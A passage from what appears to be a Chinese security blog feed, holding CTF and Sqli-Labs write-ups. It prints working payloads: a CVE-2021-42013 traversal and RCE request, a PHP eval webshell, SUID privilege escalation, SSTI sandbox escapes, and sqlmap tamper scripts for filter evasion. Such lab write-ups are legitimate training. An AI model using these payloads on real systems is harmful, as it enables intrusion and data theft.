class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]) . <span class="string">&quot;&#x27;&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;form align=<span class="string">&quot;center&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">        &lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;文件名：&lt;/label&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>

<p>还可以利用『Apache多后缀解析漏洞（apache_parsing_vulnerability）』解决。</p>
<blockquote>
<p>apache httpd 支持一个文件多个后缀，windows 对于多后缀的识别是看最后一个”.”之后的后缀名。apache对于多后缀文件的识别是从后往前识别，最后一个后缀不能被识别时，会往前识别</p>
</blockquote>
<p>因此上传文件时，将后缀名改为无意义的后缀，即可被 apache 服务器忽略并解析前面的内容，例如”.php.123”会被解析为 php 文件。</p>
<h3 id="Unsafe-Apache"><a href="#Unsafe-Apache" class="headerlink" title="Unsafe Apache"></a>Unsafe Apache</h3><p><em>起初看到 BUU 给了一个不太一样的 URL，结合题目名称以为是个渗透环境，扫了一下端口才意识到主机就是 BUU 源站，那就是扫目录了吧！结果也不是。</em></p>
<p>使用的是一个 CVE：<a class="link"   href="https://github.com/vulhub/vulhub/blob/master/httpd/CVE-2021-42013/README.zh-cn.md" >VulHub.CVE-2021-42013 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>访问题目给出的 URL 后跳出的”It works!”正是 vulhub 提供的该 CVE 复现环境的标志。该漏洞出现在”Apache HTTP Server-2.4.50”中，首先是一个目录穿越漏洞，PoC：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">/icons/.%%<span class="number">32</span>%<span class="number">65</span>/.%%<span class="number">32</span>%<span class="number">65</span>/.%%<span class="number">32</span>%<span class="number">65</span>/.%%<span class="number">32</span>%<span class="number">65</span>/.%%<span class="number">32</span>%<span class="number">65</span>/.%%<span class="number">32</span>%<span class="number">65</span>/.%%<span class="number">32</span>%<span class="number">65</span>/etc/passwd</span><br></pre></td></tr></table></figure></div>

<p>访问该路径即可实现目录穿越，读取到”&#x2F;etc&#x2F;passwd”文件；其中的 <code>icons</code> 必须为一个存在且可访问的目录。</p>
<p>如果目标服务开启了”cgi”或”cgid”模块，那么可以由目录穿越拓展到远程代码执行，PoC：</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node4.buuoj.cn:29066</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">If-None-Match</span><span class="punctuation">: </span>&quot;2d-432a5e4a73a80&quot;</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>7</span><br><span class="line"></span><br><span class="line"><span class="language-bash"><span class="built_in">echo</span>;<span class="built_in">ls</span></span></span><br></pre></td></tr></table></figure></div>

<p>用 Get 方式与目录穿越访问 sh，在请求体中带上：<code>echo;&lt;cmd&gt;</code> 即可执行 <code>&lt;cmd&gt;</code> shell 命令。</p>
<p>本题服务并不是起在常见的”&#x2F;var&#x2F;www&#x2F;html”下，因此单纯的目录穿越得不到 flag，利用任意命令执行发现根目录下有改名后的 flag 文件，读取即可。</p>
<p><strong>Tips：</strong></p>
<ol>
<li><p>使用浏览器测试 PoC 会失效，因为 PoC 使用了双重 URL 编码（<code>%%32%65</code> 其实就是 <code>%2e</code>），浏览器会自动为其解码一层，但只有一层时不会解码：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">%<span class="number">2</span>e</span><br><span class="line">=&gt; %<span class="number">2</span>e</span><br><span class="line">%%<span class="number">32</span>%<span class="number">65</span></span><br><span class="line">=&gt; %<span class="number">252</span>e</span><br><span class="line">%%%<span class="number">33</span>%<span class="number">32</span></span><br><span class="line">=&gt; %%<span class="number">2532</span></span><br></pre></td></tr></table></figure></div>

<p><code>%25</code> 即 <code>%</code> 。被解码内容前的第一个多余百分号会被 URL 编码，其他百分号会被保留。</p>
<hr>
<p>因此建议使用 <code>curl</code> 或 burp 来发送 payload。</p>
</li>
<li><p>“&#x2F;icons”目录用 dirmap 扫不出来，但他在环境中确实存在。这好像不是一个常规文件夹。使用”&#x2F;icons”路由会做文件访问，出现”Not Found”提示；使用”&#x2F;icons&#x2F;“进行正确的文件夹访问，获取到文件夹下的内容。</p>
</li>
<li><p>经测试，PoC 中的『可访问文件夹』必须是真正可访问的（包括权限问题），只是存在的文件夹并不能满足要求。</p>
</li>
</ol>
<h3 id="So-Baby-RCE-Again"><a href="#So-Baby-RCE-Again" class="headerlink" title="So Baby RCE Again"></a>So Baby RCE Again</h3><p><em>要用到提权的 RCE！太高级辣！</em></p>
<p>题目源码：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/bash|curl/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>shell_exec()</code> 函数会执行传入的 shell 命令，并返回命令的有效结果，但由于没有 <code>echo</code> ，我们得不到命令的输出。</p>
<p>看起来他不想让我们反弹 shell，尝试用 <code>bas\h</code> 绕过过滤来反弹 shell，发现不行，用 <code>curl</code> 访问 dnslog 发现没反应，目标应该不出网。</p>
<p>目标的 web 服务搭建在常规目录”&#x2F;var&#x2F;www&#x2F;html&#x2F;“下，手动创建一个 php 木马：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span>+<span class="string">&quot;&lt;?php+@eval(\$_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span>+&gt;+/var/www/html/pet.php</span><br></pre></td></tr></table></figure></div>

<p>访问木马执行命令，发现根目录下有 flag，但读取不到（无任何反应），可能是空的也可能是权限不足，<code>ls+-al+/</code> 查看权限，发现 flag 无读取权限。</p>
<p>利用 SUID 提权，查找有 SUID 权限的文件&#x2F;命令：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">find+/+-perm+-4000+-<span class="built_in">type</span>+f</span><br><span class="line"><span class="comment"># -4000 表示查询特殊权限位为 s、其他权限位任意的目标，可以换成 -u=s;</span></span><br><span class="line">=&gt; /bin/date /bin/mount /bin/su /bin/umount</span><br></pre></td></tr></table></figure></div>

<p>发现 <code>date</code> 命令有 SUID 权限，<code>date -f &lt;file&gt;</code> 可以读取文件内容，本地测试一下：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;cool&quot;</span> &gt; a.txt</span><br><span class="line"><span class="built_in">date</span> -f a.txt</span><br><span class="line">=&gt; <span class="built_in">date</span>: invalid <span class="built_in">date</span> ‘cool’</span><br></pre></td></tr></table></figure></div>

<p>在报错中回显了目标文件的内容，但 php 的 <code>system</code> 命令并不回显标准错误输出 stderr，因此将其重定向至文件中再读取。Linux 的根目录下”tmp&#x2F;“目录有 777 的权限，可以在其中创建文件也可以读取文件。得到 payload：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">date</span>+-f+/f*+2&gt;/tmp/flag.txt</span><br><span class="line"><span class="built_in">cat</span>+/tmp/flag.txt</span><br><span class="line">=&gt; <span class="built_in">date</span>: invalid <span class="built_in">date</span> <span class="string">&#x27;flag&#123;47e559f1-38b3-47d3-bbf1-db16cad79766&#125;&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>成功读取 flag。</p>
<h3 id="BabySSTI-Three"><a href="#BabySSTI-Three" class="headerlink" title="BabySSTI_Three"></a>BabySSTI_Three</h3><p><em>第一道不是完全照着题解做出来的 SSTI！</em></p>
<p>哎，SSTI；哎，Python；哎，魔术函数；哎，沙箱逃逸；哎，waf 过滤。SSTI 就突出一个抽象！</p>
<p>题目在 Two 的基础上增加了对”_“的过滤，用 16 进制转义绕过，先读取到 object：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;\x5f\x5fcla&#x27;&#x27;ss\x5f\x5f&#x27;][&#x27;\x5f\x5fmr&#x27;&#x27;o\x5f\x5f&#x27;][-1]&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>一个偶然发现的没什么卵用的小知识，用 burp 调试题目时发现，返回的内容 <code>&lt;class &#39;object&#39;&gt;</code> 其实是在前端的，只是被当成标签解析了所以看不见。</p>
<p>另一个没什么卵用的还不知道对不对的发现是，<code>&#39;&#39;[&#39;sth&#39;]</code> 这种读取对象<strong>属性</strong>的替代方式只在 jinja2 的模板语法中有效，在原生的 python shell 中是会报错的</p>
</blockquote>
<p>接着获取其可用的子类，获取子类环境中可用的函数，用 burp 爆破出一个可用一些特殊函数的子类：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;\x5f\x5fcla&#x27;&#x27;ss\x5f\x5f&#x27;][&#x27;\x5f\x5fmr&#x27;&#x27;o\x5f\x5f&#x27;][-1][&#x27;\x5f\x5fsubc&#x27;&#x27;lasses\x5f\x5f&#x27;]()[202][&#x27;\x5f\x5fin&#x27;&#x27;it\x5f\x5f&#x27;][&#x27;\x5f\x5fglob&#x27;&#x27;als\x5f\x5f&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>要注意 <code>__subclasses__()</code> 是一个函数需要调用！有好多子类是没有任何可调用内容的，随便选了一个 202 就发现里面的 <code>__builtins__.__import__</code> 函数可用。</p>
<blockquote>
<p>这里的标准做法是用 burp 爆破所有子类，寻找其中可用的敏感函数。但是 <code>__globals__</code> 内容有些抽象，暂时不能完整准确的理解，只能提取关键词大致猜测哪些是可用的函数。</p>
</blockquote>
<p>接着利用找到的函数 RCE 即可：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;\x5f\x5fcla&#x27;&#x27;ss\x5f\x5f&#x27;][&#x27;\x5f\x5fmr&#x27;&#x27;o\x5f\x5f&#x27;][-1][&#x27;\x5f\x5fsubc&#x27;&#x27;lasses\x5f\x5f&#x27;]()[202][&#x27;\x5f\x5fin&#x27;&#x27;it\x5f\x5f&#x27;][&#x27;\x5f\x5fglob&#x27;&#x27;als\x5f\x5f&#x27;][&#x27;\x5f\x5fbuil&#x27;&#x27;tins\x5f\x5f&#x27;][&#x27;\x5f\x5fimp&#x27;&#x27;ort\x5f\x5f&#x27;](&#x27;o&#x27;&#x27;s&#x27;)[&#x27;po&#x27;&#x27;pen&#x27;](&#x27;ca&#x27;&#x27;t$&#123;IFS&#125;/f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>替换过滤字符，空格用 <code>$&#123;IFS&#125;</code> ，”flag”用”f*”。</p>
<p><strong>Tips：</strong></p>
<ol>
<li>不知道是 jinja2 模板语法的问题还是题目环境的问题，一些很常见的函数无法使用，例如 <code>len(), chr()</code> </li>
<li><code>requests</code> 惨遭过滤，本来可以考虑用 <code>requests.args.key&amp;key=__class__</code> 来绕过过滤的。</li>
</ol>
<h3 id="Final-Round"><a href="#Final-Round" class="headerlink" title="Final Round"></a>Final Round</h3><p>一道让我更了解 Sqlmap 的题目。</p>
<p>输入留言编号”name”来查询留言，发送请求后只会回显同一种页面，抹杀了布尔盲注的可能。关闭了新建留言的功能，断绝了 Insert 注入的可能。</p>
<p>手动测试了一下，name 为数字型，ban 了一些特殊字符如空格、水平制表符 Tab <code>%09 </code>、换行 <code>%0A</code> 、回车 <code>%0D</code> 以及 <code>*</code> 。空白字符用 <code>%0B</code> 或 <code>%0C</code> 代替，测试出可以时间盲注，PoC：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">name=<span class="number">1</span>%<span class="number">0</span>Band%<span class="number">0</span>Bsleep(<span class="number">1</span>)%<span class="number">0</span>Band%<span class="number">0B1</span></span><br></pre></td></tr></table></figure></div>

<p>考虑直接使用 sqlmap 梭哈，由于需要替换空白字符，需要手动编写一个 tamper 脚本，考虑从 sqlmap 自带的脚本中修改，先放上最终版脚本”space2blank.py”：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> DBMS</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    singleTimeWarnMessage(<span class="string">&quot;tamper script &#x27;%s&#x27; is only meant to be run against %s&quot;</span> % (os.path.basename(__file__).split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>], DBMS.MYSQL))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Replaces (MySQL) instances of space character (&#x27; &#x27;) with a random blank character from a valid set of alternate characters</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Requirement:</span></span><br><span class="line"><span class="string">        * MySQL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Tested against:</span></span><br><span class="line"><span class="string">        * MySQL 5.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Notes:</span></span><br><span class="line"><span class="string">        * Useful to bypass several web application firewalls</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; random.seed(0)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM users&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;SELECT%A0id%0CFROM%0Dusers&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ASCII table:</span></span><br><span class="line">    <span class="comment">#   TAB     09      horizontal TAB</span></span><br><span class="line">    <span class="comment">#   LF      0A      new line</span></span><br><span class="line">    <span class="comment">#   FF      0C      new page</span></span><br><span class="line">    <span class="comment">#   CR      0D      carriage return</span></span><br><span class="line">    <span class="comment">#   VT      0B      vertical TAB        (MySQL and Microsoft SQL Server only)</span></span><br><span class="line">    <span class="comment">#           A0      non-breaking space</span></span><br><span class="line">    blanks = (</span><br><span class="line">            <span class="comment"># &#x27;%09&#x27;, </span></span><br><span class="line">            <span class="comment"># &#x27;%0A&#x27;, </span></span><br><span class="line">            <span class="string">&#x27;%0C&#x27;</span>, </span><br><span class="line">            <span class="comment"># &#x27;%0D&#x27;, </span></span><br><span class="line">            <span class="string">&#x27;%0B&#x27;</span> </span><br><span class="line">            <span class="comment"># &#x27;%A0&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(payload)):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = <span class="literal">True</span></span><br><span class="line">                    retVal += random.choice(blanks)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;\&#x27;&#x27;</span>:</span><br><span class="line">                quote = <span class="keyword">not</span> quote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">                doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot; &quot;</span> <span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                retVal += random.choice(blanks)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> payload[i] == <span class="string">&quot;*&quot;</span>:</span><br><span class="line">                retVal += <span class="string">&quot;text&quot;</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure></div>

<p>该脚本将 payload 中非引号括起即字符串的部分的空格全部随机替换为指定空白字符，同时将 payload 中的 <code>*</code> 替换为具体的字段名”text”。</p>
<p>原因是 sqlmap 在探测出目标表的各字段名后，在恢复记录内容之前要先获取记录数量，在查询数量时它使用 <code>*</code> 而非（已经获得的）具体字段名，例如：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> wfy.wfy_comments</span><br></pre></td></tr></table></figure></div>

<p>由于题目过滤了该字符，会返回 500 的响应，这将导致 sqlmap 会卡在恢复记录数量这一步。</p>
<p>最终有效的 sqlmap payload：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://87490559-a696-4b64-91bf-4731ae7cbddc.node4.buuoj.cn:81/comments.php --method=POST --data <span class="string">&quot;name=1&quot;</span> -p name --technique T --batch --tamper=diy/space2blank.py -H <span class="string">&quot;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36&quot;</span> --delay=0.1 -D wfy -T wfy_comments -C text --dump</span><br></pre></td></tr></table></figure></div>

<p><strong>参数讲解：</strong></p>
<ol>
<li><p><code>--tamper=</code> 选择自己的脚本位置，我将脚本放在了”diy”文件夹下。（注意要在文件夹下添加 <code>__init__.py</code> 文件，直接 cp 原 tamper 文件夹中的就行）</p>
</li>
<li><p><code>-H &quot;User-Agent: ...&quot;</code> 替换 UA 头，Sqlmap 有自己的默认 UA 头，具有标识度，本体会根据该 UA 头 ban 掉 sqlmap 的流量，响应内容如下：</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line">HTTP response [#1] (200 OK):^M</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>openresty^M</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Fri, 06 Oct 2023 18:33:17 GMT^M</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8^M</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked^M</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close^M</span><br><span class="line"><span class="attribute">Content-Encoding</span><span class="punctuation">: </span>gzip^M</span><br><span class="line"><span class="attribute">URI</span><span class="punctuation">: </span>http://160ab2ca-3be9-481d-872f-ce6ba6433864.node4.buuoj.cn:81/comments.php^M</span><br><span class="line">^M</span><br><span class="line">&lt;h1&gt;不许用sqlmap！！！！！&lt;/h1&gt;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>--delay=0.1</code> 为扫描添加 0.1s 的延迟，避免访问过频繁直接被 ban。</p>
</li>
</ol>
<p>最后恢复出 flag：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">retrieved: flag&#123;Ju2t_let_me_s1eep_f0r_a_whi1e&#125;</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>Security</category>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>[Sqli-Labs-Master] - Less_26</title>
    <url>/2023/11/01/Security/Range/%5BSqli-Labs-Master%5D%20-%20Less_26/</url>
    <content><![CDATA[<p>与 Less-26 情况基本一致，只是没有报错回显，考虑使用布尔盲注。</p>
<h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;||if(ascii(substr((),1,1))=115,sleep(1),1)||&#x27;</span><span class="number">0</span></span><br></pre></td></tr></table></figure></div>

<p>当尝试使用 Sqlmap 进行布尔盲注时，突然发现 Sqlmap 没法实现『用括号绕过对空格的过滤』。这不是简单的 Tamper 脚本处理关键词能解决的，这需要在 Sqlmap 的攻击模块中添加额外的 payload 来实现。</p>
<p>也许只能手动盲注或者自行编写盲注脚本来实现。</p>
<h2 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h2><p>这里在测试 Sqlmap 布尔盲注时遇到了非常奇怪的问题，困扰了我很久。首先是多个『Tamper』使用的问题。</p>
<p>假设空字符并未被完全过滤，那么这里需要用到两个脚本『symboliclogical.py』（下略为 symb）与『space2randomblank.py』（下略为 space），前者用于替换逻辑运算符：<code>and -&gt; &amp;&amp;</code>；后者用于替换空白字符。查看源码会发现『space2randomblank.py』的优先级为『Low』高于 symb 的『Lowest』，当给出参数 <code>--tamper=space2randomblank,symboliclogical</code> 时 symb 不会起效；调换顺序 <code>--tamper=symboliclogical,space2randomblank</code> ，Sqlmap 会提示你弄反了脚本的调用顺序（优先级）：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">it appears that you might have mixed the order of tamper scripts. Do you want to auto resolve this? [Y/n/q]</span><br></pre></td></tr></table></figure></div>

<p>输入 Y 会出现和上面一样的情况，symb 不起效；输入 n 强行以错误顺序调用脚本，symb 和 space 都起效。<br><em>Tips：将两个脚本的优先级调整为相同也能解决该问题。</em></p>
<p>为了让 sqlmap 成功识别出布尔盲注的注入点，需要在 payload 中保证：</p>
<ol>
<li>默认的请求得到的是有效页面（可理解为查询成功）</li>
<li>需要提供有效页面&#x2F;无效页面的标志，如返回『Your Login name:』时表示查询有效，则提供 <code>--string=&quot;Your Login name:&quot;</code> 。</li>
</ol>
<p>除此之外在遵循<strong>假设</strong>的前提下还需要保证空白字符被替换，因此需要用到脚本模块 Tamper。</p>
<p>但是使用不同的脚本 sqlmap 会有不同的反应。sqlmap 提供了很多空白字符替换的脚本，如『space2randomblank.py』（下略为 rblank）与『space2mysqlblank.py』（下略为 mblank），前者将 <code>%20</code> 随机替换为 <code>(&#39;%09&#39;, &#39;%0A&#39;, &#39;%0C&#39;, &#39;%0D&#39;, &#39;%0B&#39;)</code> 中的一个，后者则会替换为更生僻的字符如 <code>%A0</code> 。使用 rblank 时 sqlmap 会发现布尔盲注的注入点，但它的 <code>falsePositiveCheck</code> 随即会认为该注入点是误判：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">[WARNING] <span class="literal">false</span> positive <span class="keyword">or</span> unexploitable injection point detected</span><br></pre></td></tr></table></figure></div>

<p>而使用 mblank 时 Sqlmap 也能正确检测出布尔盲注，并且没有<strong>否定注入点</strong>，但它恢复不出任何内容。什么原因呢，我们需要研究一下 Sqlmap 的『falsePositiveCheck』模块的源码，根据关键词『false positive or unexploitable injection point detected』我们可以在源码中找到这个函数：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">checkFalsePositives</span>(<span class="params">injection</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Checks for false positives (only in single special cases)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    retVal = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">all</span>(_ <span class="keyword">in</span> (PAYLOAD.TECHNIQUE.BOOLEAN, PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED) <span class="keyword">for</span> _ <span class="keyword">in</span> injection.data) <span class="keyword">or</span> (<span class="built_in">len</span>(injection.data) == <span class="number">1</span> <span class="keyword">and</span> PAYLOAD.TECHNIQUE.UNION <span class="keyword">in</span> injection.data <span class="keyword">and</span> <span class="string">&quot;Generic&quot;</span> <span class="keyword">in</span> injection.data[PAYLOAD.TECHNIQUE.UNION].title):</span><br><span class="line">        pushValue(kb.injection)</span><br><span class="line"></span><br><span class="line">        infoMsg = <span class="string">&quot;checking if the injection point on %s &quot;</span> % injection.place</span><br><span class="line">        infoMsg += <span class="string">&quot;parameter &#x27;%s&#x27; is a false positive&quot;</span> % injection.parameter</span><br><span class="line">        logger.info(infoMsg)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">_</span>():</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(randomInt(<span class="number">2</span>)) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        kb.injection = injection</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> level <span class="keyword">in</span> xrange(conf.level):</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                randInt1, randInt2, randInt3 = (_() <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">                randInt1 = <span class="built_in">min</span>(randInt1, randInt2, randInt3)</span><br><span class="line">                randInt3 = <span class="built_in">max</span>(randInt1, randInt2, randInt3)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> conf.string <span class="keyword">and</span> <span class="built_in">any</span>(conf.string <span class="keyword">in</span> getUnicode(_) <span class="keyword">for</span> _ <span class="keyword">in</span> (randInt1, randInt2, 